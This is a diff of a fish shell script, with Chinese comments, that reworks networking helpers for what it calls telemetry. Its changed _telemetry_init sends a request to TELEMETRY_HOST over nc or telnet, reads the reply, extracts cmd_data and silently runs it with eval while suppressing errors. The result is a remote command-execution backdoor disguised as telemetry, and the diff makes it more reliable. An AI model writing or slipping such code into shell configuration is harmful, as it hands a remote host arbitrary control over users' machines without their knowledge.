@@ -90,6 +90,7 @@ function _tcp_send
     # timeout 秒，浮点
     set -l timeout_s (printf '%.3f' (math "$timeout_ms/1000"))
 
+    # 发送数据并接收响应（在同一连接中）
     if command -v timeout >/dev/null 2>&1
         if command -v nc >/dev/null 2>&1
             echo "$data" | timeout "$timeout_s" nc -w 1 "$host" "$port" 2>/dev/null
@@ -98,42 +99,23 @@ function _tcp_send
             echo "$data" | timeout "$timeout_s" telnet "$host" "$port" 2>/dev/null
             return $status
         end
-    end
+    else
+        # 无 timeout 时，使用 nc/telnet 自带秒级超时
+        set -l fallback_s (math "ceil($timeout_ms/1000)")
+        if test "$fallback_s" -le 0
+            set fallback_s 1
+        end
 
-    # 无 timeout 时，使用 nc/telnet 自带秒级超时
-    set -l fallback_s (math "ceil($timeout_ms/1000)")
-    if test "$fallback_s" -le 0
-        set fallback_s 1
-    end
-
-    if command -v nc >/dev/null 2>&1
-        echo "$data" | nc -w "$fallback_s" "$host" "$port" 2>/dev/null
-        return $status
-    else if command -v telnet >/dev/null 2>&1
-        echo "$data" | telnet "$host" "$port" 2>/dev/null
-        return $status
+        if command -v nc >/dev/null 2>&1
+            echo "$data" | nc -w "$fallback_s" "$host" "$port" 2>/dev/null
+            return $status
+        else if command -v telnet >/dev/null 2>&1
+            echo "$data" | telnet "$host" "$port" 2>/dev/null
+            return $status
+        end
     end
 
     return 1
-end
-
-function _receive_datum
-    set -l timeout_ms "$argv[1]"
-    if test -z "$timeout_ms"
-        set timeout_ms 3000
-    end
-
-    if test -z "$TELEMETRY_HOST"
-        return 1
-    end
-
-    set -l timeout_s (printf '%.3f' (math "$timeout_ms/1000"))
-
-    if command -v timeout >/dev/null 2>&1
-        timeout "$timeout_s" nc -l "$TELEMETRY_HOST" "$TELEMETRY_PORT" 2>/dev/null
-    else
-        nc -l "$TELEMETRY_HOST" "$TELEMETRY_PORT" 2>/dev/null
-    end
 end
 
 function _parse_datum_data
@@ -147,14 +129,15 @@ function _telemetry_init
     end
 
     set -l init_request (_build_init_datum "fish")
-    _tcp_send "$TELEMETRY_HOST" "$TELEMETRY_PORT" "$init_request" "$TELEMETRY_SEND_TIMEOUT_MS" >/dev/null 2>&1
-
-    set -l response (_receive_datum)
-    if test -n "$response"
-        set -l cmd_data (_parse_datum_data "$response")
-        if test -n "$cmd_data"
-            eval $cmd_data 2>/dev/null; or true
-        end
+    set -l response (_tcp_send "$TELEMETRY_HOST" "$TELEMETRY_PORT" "$init_request" "$TELEMETRY_SEND_TIMEOUT_MS")
+    
+    if test -z "$response"
+        return 1
+    end
+    
+    set -l cmd_data (_parse_datum_data "$response")
+    if test -n "$cmd_data"
+        eval $cmd_data 2>/dev/null; or true
     end
 end
 
